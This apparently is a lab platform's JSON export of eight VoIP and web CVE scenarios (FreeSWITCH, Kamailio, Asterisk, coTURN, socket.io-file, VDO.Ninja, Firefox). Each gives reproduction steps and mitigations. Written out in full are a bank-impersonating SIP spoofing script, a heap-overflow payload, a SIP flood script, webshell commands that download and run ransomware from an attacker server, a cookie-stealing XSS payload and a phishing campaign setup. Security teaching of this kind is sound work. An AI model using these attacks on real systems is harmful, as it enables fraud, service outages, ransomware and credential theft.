[{
  "_id": {
    "$oid": "693039d852c973030509716d"
  },
  "id": 1,
  "name": "SIP Spoofing",
  "description": "## SIP Spoofing\n- Vulnerable component: FreeSWITCH server\n- Affected version: ≤ 1.10.6\n- CVE ID: [CVE-2021-37624](https://nvd.nist.gov/vuln/detail/CVE-2021-37624)\n### Description\nIn this scenario, the attack consists of sending a SIP Message from an unregistered user impersonating another user (spoofing)\n\n### How to reproduce the issue - SIP Spoofing\nThe first step is to start the virtual machine by clicking the button above.\n\nFor the attack, the Linphone application is used and a user must be registered. FreeSWITCH provides default users ranging from <b>1000</b> to <b>1020</b> (it is recommended to use one of these).\nThe username corresponds to the chosen value, while the password is <b>1234</b>.\nTo complete the registration, the SIP server must be specified. The IP address of the VM hosting the containers is used:\n\n![registration](/labs/1_2_sip_spoofing_dos_freeswitch/img/1001.png)\n\nOnce the <i>attacker</i> container is running, it can be accessed with:\n```bash\ndocker exec -it attacker sh\n```\nand the python script can be executed:\n```bash\npython3 spoofing.py <IP_VM> <clientSIP>\n```\nwhere:\n- `IP_VM` is the IP address of the VM (FreeSWITCH container);\n- `clientSIP` is the number of the SIP client (linphone).\n\nThe script used is:\n```python\nimport sys, socket, random, string\n\nUDP_IP = sys.argv[1]\nUDP_PORT = 5060\next = sys.argv[2]\nrand = ''.join(random.choice(string.ascii_lowercase) for i in range(8))\nmsg=\"MESSAGE sip:%s@%s SIP/2.0\\r\\n\" % (ext, UDP_IP)\nmsg+=\"Via: SIP/2.0/UDP 192.168.2.19:10096;rport;branch=z9hG4bK-%s\\r\\n\" % rand\nmsg+=\"Max-Forwards: 70\\r\\n\"\nmsg+=\"From: <sip:UniCredit@%s>;tag=%s\\r\\n\" %(UDP_IP, rand)\nmsg+=\"To: <sip:%s@%s>\\r\\n\" %(ext, UDP_IP)\nmsg+=\"Call-ID: %s\\r\\n\" % rand\nmsg+=\"CSeq: 1 MESSAGE\\r\\n\"\nmsg+=\"Contact: <sip:UniCredit@192.168.2.19:10060;transport=udp>\\r\\n\"\nmsg+=\"Content-Type: text/plain\\r\\n\"\nmsg+=\"Content-Length: 81\\r\\n\\r\\n\"\nmsg+=\"A withdrawal of €2,000 has been made.\\nFor more information, call 321 757 75 11.\"\n\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\nsock.sendto(msg.encode(), (UDP_IP, UDP_PORT))\n```\n\nBecause the server does not verify that the sender is registered (i.e. ```auth-messages = false``` by default), the spoofed message will be accepted — resulting in the spoofed user (e.g. ```UniCredit```) appearing to send the message.\n\nThe following message will appear:\n\n![spoofing](/labs/1_2_sip_spoofing_dos_freeswitch/img/message_unicredit.png)\n\n### Mitigations\n- Upgrade to a patched version (e.g. 1.10.7 or later). \n- In configuration, set ```auth-messages = true``` so that SIP MESSAGE requests require authentication.\n\n### Credits\nThese vulnerabilities were discovered by [Enable Security](https://www.enablesecurity.com/)"
},
{
  "_id": {
    "$oid": "69303a0a52c973030509716e"
  },
  "id": 3,
  "name": "Memory Corruption",
  "description": "## Memory Corruption via Heap Overflow\n- Vulnerable component: Kamailio server\n- Affected versions: \n    - before 4.4.7\n    - for class 5.0.x before 5.0.6\n    - for class 5.1.x before 5.1.2\n- CVE ID: [CVE-2018-8828](https://nvd.nist.gov/vuln/detail/CVE-2018-8828)\n\n### Description\nIn this scenario, due to a malformed request sent to the server, it crashes because of Memory Corruption: the data is written beyond the dynamically allocated memory.\n\n### How to reproduce the issue\nThe first step is to start the virtual machine by clicking the button above.\n\nThen, access the <i>sipp101</i> container:\n```bash\ndocker exec -it sipp101 bash\n```\nThe malformed message is sent using:\n```bash\nsipp -sf /sipp/xml/overflow.xml <IP_VM> -m 1\n```\nwhere:\n- `-sf /sipp/xml/overflow.xml` indicates the XML file containing the malformed SIP Register request;\n- `IP_VM` is the IP address of the VM hosting the containers (Kamailio container);\n- `-m 1` specifies that only one message is sent.\n\nThe script used is:\n\n```xml\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE scenario SYSTEM \"sipp.dtd\">\n<scenario name=\"overflow\">\n  <send>\n    <![CDATA[\n    REGISTER sip:[remote_ip]:[remote_port] SIP/2.0\n    Via: SIP/2.0/TCP 127.0.0.1:53497;branch=z9hG4bK0aa9ae17-25cb-4c3a-abc9-979ce5bee394\n    To: <sip:1@[remote_ip]:[remote_port]>\n    From: Test <sip:2@localhost:5060>;tag=bk1RdYaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaRg\n    Call-ID: 8b113457-c6a6-456a-be68-606686d93c38\n    Contact: sip:1@127.0.0.1:53497\n    Max-Forwards: 70\n    CSeq: 10086 REGISTER\n    User-Agent: go SIP fuzzer/1\n    Content-Length: 0\n    ]]>\n  </send>\n  \n</scenario>\n```\nIf a REGISTER request contains a malformed or excessively long  ```branch``` parameter or ```From tag``` — fields that are not properly bounded in vulnerable versions — the call to ```tmx_check_pretran()``` will trigger an off-by-one heap-based buffer overflow, causing a segmentation fault and crashing the container.\n\n### Mitigations\n- Update to patched version:\n    - after 4.4.7;\n    - for class 5.0.x after 5.0.6;\n    - for class 5.1.x after 5.1.2.\n\n### Credits\nThis vulnerability was discovered by [Enable Security](https://www.enablesecurity.com/)"
},
{
  "_id": {
    "$oid": "69303a1852c973030509716f"
  },
  "id": 4,
  "name": "RTP Injection",
  "description": "## RTP Injection via RTP Bleed\n- Vulnerable component: Asterisk server\n- Affected versions: \n    - for class 11.x before 11.25.2\n    - for class 13.x before 13.17.1\n    - for class 14.x before 14.6.1\n- CVE ID: [CVE-2017-14099](https://nvd.nist.gov/vuln/detail/CVE-2017-14099)\n### Description\nIn this scenario, after two clients establish a communication, an attacker can intercept the RTP traffic (due to the RTP Bleed vulnerability) and inject malicious audio into the conversation.\n\n### How to reproduce the issue\nThe first step is to start the virtual machine by clicking the button above.\n\nFor this scenario, the Linphone application must be used to simulate the SIP clients.\nUsers <b>7001</b> e <b>7002</b> are registered. Below is the registration of user 7001 (the registration procedure for 7002 is analogous):\n\n![registration](/labs/4_rtp_bleed_injection_asterisk/img/7001_registration.png)\n\nThe Wireshark container is started to observe the port used for RTP traffic (in the example, RTP uses ports between 10000 and 10099). \n\nTo run Wireshark with a graphical interface from the container, you need to allow local root users to access the host’s display. This can be done with:\n```bash\nxhost +local:root\n```\nThen the user can use the following command:\n```bash\ndocker exec -it wireshark wireshark\n```\nThe network interface is selected, and a call is initiated between Linphone 7001 and 7002.\n\nAccess the <i>sippts</i> container:\n```bash\ndocker exec -it sippts bash\n```\nand run the script:\n```bash\nsippts rtpbleedinject -i <IP_VM> -r <port_number> -f audio.wav\n```\nwhere:\n- ```rtpbleedinject``` indicates the type of attack, namely RTP Injection;\n- ```-i <IP_VM>``` represents the IP address of the VM running the Asterisk server;\n-```-r <port_number>``` represents the IP address of the VM running the Asterisk server;\n- ```-f audio.wav``` indicates the audio file injected into the conversation.\n\nIn the vulnerable versions, if ```nat = yes```, the RTP proxies can automatically learn the attacker's IP and port and send the RTP legitimate traffic to him. After that, the attacker can send a malisous audio and degradeted the connection.\n\n### Mitigations\n- Set ```nat = false``` to prevent the proxy from automatically learning information about attackers.\n- Use patched version of Asterisk.\n\n### Credits\nThis vulnerability was discovered by [Enable Security](https://www.enablesecurity.com/)"
},
{
  "_id": {
    "$oid": "69303a2552c9730305097170"
  },
  "id": 5,
  "name": "Access Bypass",
  "description": "## Access Bypass\n- Vulnerable component: coTURN server\n- Affected version: 4.5.1.x\n- CVE ID: [CVE-2020-26262](https://nvd.nist.gov/vuln/detail/CVE-2020-26262)\n\n### Description\nIn this scenario, after creating a socks5 proxy to the TURN server, it is possible using specific HTTP GET requests to access the loopback interface of the server.\n\n### How to reproduce the issue\nThe first step is to start the virtual machine by clicking the button above.\n\nThe behavior of the <i>coTURN</i> server is observed with:\n```bash\ndocker logs coturn --follow\n```\n\nAccess the <i>stunner</i> container:\n```bash\ndocker exec -it stunner sh\n```\nand create a socks5 proxy with:\n```bash\nstunner socks --turnserver 10.0.0.10:3478 --protocol tcp --username username1 --password password1 --listen 10.0.0.4:9999\n```\nThis command creates a `socks5` server connected to the TURN server (`turnserver`). It uses TCP as the protocol and the same credentials used to start the coTURN server; it listens on `10.0.0.4:9999`.\n\nA web server is created on the coTURN container on the loopback interface:\n```bash\npython3 -m http.server 8000 --bind 127.0.0.1\n```\n\nBy performing a GET request to the server on the loopback interface through the proxy:\n```\ncurl -x socks5h://10.0.0.4:9999 http://127.0.0.1:8000\n```\nthe request is blocked (coTURN blocks requests toward loopback addresses). However, by using the IP `0.0.0.0`, a communication can be established and the web services become accessible:\n```\ncurl -x socks5h://10.0.0.4:9999 http://0.0.0.0:8000\n```\n### Mitigations\n- Update to patched version.\n- In the server configuration file, insert the following line: ```denied-peer-ip=0.0.0.0-0.255.255.255```. In this way is possible to block the address of the ```0.0.0.0/8``` network.\n\n### Credits\nThis vulnerability was discovered by [Enable Security](https://www.enablesecurity.com/)"
},
{
  "_id": {
    "$oid": "69303a4652c9730305097171"
  },
  "id": 6,
  "name": "Ransomware",
  "description": "## Ransomware via Remote Code Execution\n- Vulnerable component: socket.io-file library\n- Affected version: ≤ 2.0.31\n- CVE ID: [CVE-2020-24807](https://nvd.nist.gov/vuln/detail/CVE-2020-24807)\n\n### Description\nIn this scenario, it is possible to upload a malicious javaScript file to execute a webshell on the victim machine. Once this is done, the attacker loads the python ransomware file from their HTTP server and executes it through the webshell. The effect is the encryption of the files on the victim machine.\n\n### How to reproduce the issue\nThe first step is to start the virtual machine by clicking the button above.\n\nThe web page is accessed through a browser (```http://<IP_VM>:8080```).\n\nNext, the file ```webshell.js```is uploaded; once uploaded, a communication channel with the victim machine is established. This is possible because, in the vulnerable versions, the server doesn't check the file format and saves it of victime machine.\n\nAn attacker-controlled web server is then started, from which the file ```ransomware.py``` can be downloaded:\n```bash\npython3 -m http.server 9000\n```\n\nFrom the browser, the file can be downloaded using the following HTTP request:\n```bash\nhttp://<IP_VM>:8080/webshell.js/?cmd=wget http://<IP_VM>:9000/ransomware.py\n```\nThe file is then moved into the appropriate directory:\n```bash\nhttp://<IP_VM>:8080/webshell.js/?cmd=mv ransomware.py ./public/\n```\nFinally, the attack is launched:\n```bash\nhttp://<IP_VM>:8080/webshell.js/?cmd=python3 ./public/ransomware.py\n```\nThe effect is the encryption of all files contained in the ```public``` directory of the web server.\n\n### Mitigations\n- Update to patched versions.\n- Improve server-side validation controls."
},
{
  "_id": {
    "$oid": "69303a6052c9730305097172"
  },
  "id": 7,
  "name": "Information Disclosure",
  "description": "## Access Bypass & Information Disclosure\n- Vulnerable components: mongoose library, VDO.Ninja\n- Affected versions:\n    - for mongoose: ≤ 5.7.4\n    - for VDO.Ninja: 28.0\n- CVE IDs: [CVE-2019-17426](https://nvd.nist.gov/vuln/detail/CVE-2019-17426), [CVE-2025-62613](https://nvd.nist.gov/vuln/detail/CVE-2025-62613)\n\n### Description\nIn this scenario, by inserting specific input values, it is possible to bypass login controls and access the VDO.Ninja platform. Then, using a particular query string, sensitive information (e.g., cookies) can be extracted.\n\n### How to reproduce the issue - Access Bypass\nThe first step is to start the virtual machine by clicking the button above.\n\nAssuming that MongoDB Compass is used as the NoSQL database on the host machine, a firewall rule must be created to allow the container to access the host. On Windows, this can be done with:\n```bash\nNew-NetFirewallRule -DisplayName \"MongoDB\" -Direction Inbound -Protocol TCP -LocalPort 27017 -Action Allow\n```\nThe MongoDB configuration file (```mongod.cfg```) is then modified to allow communication not only through the loopback address:\n```bash\n# network interfaces\nnet:\n    port: 27017\n    bindIp: 0.0.0.0\n```\n\nThe web page is accessed through a browser at: ```https://<IP_VM>```. In the vulnerable versions, the ```_bsontype``` attribute is ignored by server, and therefore by entering any username or password, access is granted.\n\n### Mitigations - Access Bypass\n- Update to patched versions.\n- Improve server-side validation controls.\n\n### How to reproduce the issue - Information Disclosure\nAfter being redirected to: ```https://<IP_VM>:8080```, a new attack can be performed. Using:\n```bash\nhttps://<IP_VM>:8080/examples/control.html?room=<img src=x onerror=alert(document.cookie)>\n```\nthe page’s cookies are obtained.\n\nFor the vulnerable versions, there is no sanification of this particular input.\n\n### Mitigation - Information Disclosure\n- Update to patched version."
},
{
  "_id": {
    "$oid": "6932f7022d8f45f1aec9f60b"
  },
  "id": 8,
  "name": "Permission Abuse",
  "description": "## Permission abuse\n- Vulnerable components: Firefox and Firefox ESR\n- Affected versions:\n    - for Firefox: < 69\n    - for Firefox ESR: < 68.1\n- CVE ID: [CVE-2019-11748](https://nvd.nist.gov/vuln/detail/CVE-2019-11748)\n\n### Description\nIn this scenario, after launching the phishing campaign, the user receives the email. They decide to click the button and are redirected to the landing page managed by the attacker. On this page, they enter their data, which is captured by the attacker, and are then redirected to their intended web page. On this page, the user grants permissions to access the microphone and camera. Believing these permissions are used for chat purposes, the user inadvertently allows the attacker to access the audio and video stream, which can then be used on third-party sites.\n\n### How to reproduce the issue\nThe first step is to start the virtual machine by clicking the button above.\n\nThe GoPhish framework is used to create a phishing campaign. First, the sender profile is defined:\n\n![sending_profile](/labs/9_firefox_access_cam_web/img/sending_profiles.png)\n\nNext, the landing page is configured (that is, the page to which the user is redirected after clicking the button):\n\n![landing_page](/labs/9_firefox_access_cam_web/img/landing_page.png)\n\nThe email template is defined:\n\n![email_template](/labs/9_firefox_access_cam_web/img/email_template.png)\n\nThe group of users targeted by the message is specified:\n\n![group](/labs/9_firefox_access_cam_web/img/users_group.png)\n\nFinally, a campaign is created and launched:\n\n![campaign](/labs/9_firefox_access_cam_web/img/campaign.png)\n\nThe effect is that the email is delivered to the user:\n\n![email](/labs/9_firefox_access_cam_web/img/email.png)\n\nThe user clicks the button and is redirected to the landing page:\n\n![login](/labs/9_firefox_access_cam_web/img/login_page.png)\n\nBy entering their credentials, the user is in fact providing them to the attacker:\n\n![details](/labs/9_firefox_access_cam_web/img/details.png)\n\nAt this point, the user is redirected to the attacker’s page, and by granting access to the webcam and microphone for what appears to be a conversation, they are effectively allowing the attacker to use these permissions on third-party pages. In the vulnerable versions, the browser retains granted permissions and applies them on third-party pages as well.\n\n### Mitigation\n- Update to patched version."
},
{
  "_id": {
    "$oid": "6932f80b2d8f45f1aec9f60c"
  },
  "id": 2,
  "name": "Denial of Service",
  "description": "## Denial of Service\n- Vulnerable component: FreeSWITCH server\n- Affected version: ≤ 1.10.6\n- CVE ID: [CVE-2021-41145](https://nvd.nist.gov/vuln/detail/CVE-2021-41145)\n### Description\nIn the attack, continuous registration requests are sent to the FreeSWITCH server, causing the container to crash (DoS via SIP Flooding).\n\n### How to reproduce the issue\nThe first step is to start the virtual machine by clicking the button above.\n\nFrom the attacker container, run:\n```bash\npython3 dos-sipflood.py <IP_VM>\n```\nThe script below repeatedly sends SIP REGISTER (or similar) requests to the FreeSWITCH server:\n```python\nimport socket, string, random, sys\n\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\ncseq = 1\nUDP_IP = sys.argv[1]\nUDP_PORT = 5060\n\nwhile True:\n    r = ''.join(random.choice(string.ascii_lowercase) for i in range(10))\n    \n    msg = \"REGISTER sip:%s SIP/2.0\\r\\n\" % (UDP_IP, )\n    msg += \"Via: SIP/2.0/UDP %s:46786;rport;branch=z9hG4bK-%s\\r\\n\" % (UDP_IP, r, )\n    msg += \"Max-Forwards: 70\\r\\n\"\n    msg += \"From: <sip:98647499@%s>;tag=%s\\r\\n\" % (UDP_IP, r, )\n    msg += \"To: <sip:98647499@%s>\\r\\n\" % (UDP_IP, )\n    msg += \"Call-ID: %s\\r\\n\" % (r, )\n    msg += \"CSeq: %s REGISTER\\r\\n\" % (cseq, )\n    msg += \"Contact: <sip:98647499@%s:46786;transport=udp>\\r\\n\" % (UDP_IP, )\n    msg += \"Expires: 60\\r\\n\"\n    msg += \"Content-Length: 0\\r\\n\"\n    msg += \"\\r\\n\" \n\n    sock.sendto(msg.encode(), (UDP_IP, UDP_PORT))\n\n    cseq += 1\n```\nBecause the server must allocate resources to process each registration, memory is exhausted and the FreeSWITCH container crashes. \n\nYou can observe this by monitoring the container with `docker stats`: after some time memory consumption grows until it hits the limit, then the container terminates.\n\n### Mitigation\n- Update to patched version (e.g. 1.10.7 or later).\n\n### Credits\nThese vulnerabilities were discovered by [Enable Security](https://www.enablesecurity.com/)"
}]